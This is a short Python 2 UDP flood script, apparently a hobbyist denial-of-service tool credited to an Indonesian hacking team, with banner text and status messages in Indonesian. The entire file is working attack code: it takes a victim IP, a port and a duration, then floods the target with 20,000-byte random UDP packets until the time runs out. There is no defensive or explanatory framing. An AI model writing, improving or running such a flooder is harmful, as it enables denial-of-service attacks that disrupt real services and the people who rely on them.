import time
import socket
import random
import sys
def usage():
    print "\033[1;32m#########################################################"
    print "#   \033[1;91mCommand: " "python2 R133FDDOS.py " "<ip> <port> <packet>  \033[1;32m#"
    print "\033[1;32m#\033[1;91mTeam\033[1;37m  :DevlinCyberTeam                                 \033[1;32m#"
    print "\033[1;32m#\033[1;91mAuthor\033[1;37m:Mr.4R13F                                        \033[1;32m#"
    print "\033[1;32m#\033[1;91mThanks\033[1;37m:Mr.KRT58X                                       \033[1;32m#"
    print "\033[1;32m#########################################################"
def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)                                                                                    # 20000 representasi satu byte ke server
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mMemulai \033[1;32m%s \033[1;91mmengirim paket \033[1;32m%s \033[1;91mpada port \033[1;32m%s"%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
